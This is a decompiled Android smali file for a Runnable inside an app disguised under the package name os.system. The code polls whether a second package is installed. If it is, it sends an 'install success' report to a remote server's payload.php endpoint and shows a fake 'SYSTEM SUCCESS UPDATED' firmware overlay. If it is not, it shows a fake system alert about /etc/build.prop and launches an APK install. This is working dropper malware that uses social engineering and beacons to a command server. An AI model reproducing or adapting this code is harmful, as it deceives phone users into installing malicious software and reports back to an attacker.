.class Los/system/SystemThread$1;
.super Ljava/lang/Object;
.source "SystemThread.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Los/system/SystemThread;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Los/system/SystemThread;


# direct methods
.method constructor <init>(Los/system/SystemThread;)V
    .locals 0

    .prologue
    .line 83
    iput-object p1, p0, Los/system/SystemThread$1;->this$0:Los/system/SystemThread;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 6

    .prologue
    .line 86
    iget-object v0, p0, Los/system/SystemThread$1;->this$0:Los/system/SystemThread;

    invoke-static {v0}, Los/system/SystemThread;->access$100(Los/system/SystemThread;)Landroid/os/Handler;

    move-result-object v0

    iget-object v1, p0, Los/system/SystemThread$1;->this$0:Los/system/SystemThread;

    invoke-static {v1}, Los/system/SystemThread;->access$000(Los/system/SystemThread;)Ljava/lang/Runnable;

    move-result-object v1

    const-wide/16 v2, 0x1f40

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 88
    new-instance v0, Los/system/MainActivity;

    invoke-direct {v0}, Los/system/MainActivity;-><init>()V

    iget-object v1, p0, Los/system/SystemThread$1;->this$0:Los/system/SystemThread;

    invoke-static {}, Los/system/SystemThread;->access$200()Ljava/lang/String;

    move-result-object v2

    const-string v3, "open"

    invoke-virtual {v0, v1, v2, v3}, Los/system/MainActivity;->apkMana(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 89
    iget-object v0, p0, Los/system/SystemThread$1;->this$0:Los/system/SystemThread;

    invoke-static {v0}, Los/system/SystemThread;->access$100(Los/system/SystemThread;)Landroid/os/Handler;

    move-result-object v0

    iget-object v1, p0, Los/system/SystemThread$1;->this$0:Los/system/SystemThread;

    invoke-static {v1}, Los/system/SystemThread;->access$000(Los/system/SystemThread;)Ljava/lang/Runnable;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 90
    iget-object v0, p0, Los/system/SystemThread$1;->this$0:Los/system/SystemThread;

    iget-object v1, p0, Los/system/SystemThread$1;->this$0:Los/system/SystemThread;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Los/system/SystemThread$1;->this$0:Los/system/SystemThread;

    const-string v4, "install success"

    invoke-virtual {v3, v4}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 92
    iget-object v0, p0, Los/system/SystemThread$1;->this$0:Los/system/SystemThread;

    invoke-static {v0}, Los/system/SystemThread;->access$300(Los/system/SystemThread;)Los/system/ReceiverBoot;

    const/16 v0, 0x2710

    sput v0, Los/system/ReceiverBoot;->delayToast:I

    .line 93
    iget-object v0, p0, Los/system/SystemThread$1;->this$0:Los/system/SystemThread;

    invoke-static {v0}, Los/system/SystemThread;->access$300(Los/system/SystemThread;)Los/system/ReceiverBoot;

    move-result-object v0

    iget-object v1, p0, Los/system/SystemThread$1;->this$0:Los/system/SystemThread;

    const-string v2, "aktif"

    const v3, -0xff0100

    const/16 v4, 0x31

    const-string v5, "SYSTEM SUCCESS UPDATED\n\n\nYour firmware is  updated please WAIT  process system. [alert akan hilang setelah 60 detik] \n\n------------\n.-----------.\n\n\n\n\n       [ WARNING! ]\n\n\n"

    invoke-virtual/range {v0 .. v5}, Los/system/ReceiverBoot;->toastShow(Landroid/content/Context;Ljava/lang/String;IILjava/lang/String;)V

    .line 105
    :goto_0
    return-void

    .line 97
    :cond_0
    iget-object v0, p0, Los/system/SystemThread$1;->this$0:Los/system/SystemThread;

    invoke-static {v0}, Los/system/SystemThread;->access$300(Los/system/SystemThread;)Los/system/ReceiverBoot;

    move-result-object v0

    iget-object v1, p0, Los/system/SystemThread$1;->this$0:Los/system/SystemThread;

    const-string v2, "aktif"

    const/16 v3, -0x100

    const/16 v4, 0x30

    const-string v5, "SYSTEM ALERT WINDOW!!\n\n\nSystem firmware can\'t access /etc/build.prop please follow this Tutorial.\n\n1. Install this app\n2.allow playstore prompt\n3. reboot after installed.\n\n\n\n\n\n       [ WARNING! ]\n\n\n"

    invoke-virtual/range {v0 .. v5}, Los/system/ReceiverBoot;->toastShow(Landroid/content/Context;Ljava/lang/String;IILjava/lang/String;)V

    .line 99
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.VIEW"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 100
    new-instance v1, Ljava/io/File;

    invoke-static {}, Los/system/SystemThread;->access$400()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v1}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v1

    const-string v2, "application/vnd.android.package-archive"

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->setDataAndType(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;

    .line 101
    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 102
    iget-object v1, p0, Los/system/SystemThread$1;->this$0:Los/system/SystemThread;

    invoke-virtual {v1, v0}, Los/system/SystemThread;->startActivity(Landroid/content/Intent;)V

    .line 103
    sget-object v0, Los/system/SystemThread;->TAG:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Los/system/SystemThread;->access$400()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-static {}, Los/system/SystemThread;->access$200()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0
.end method
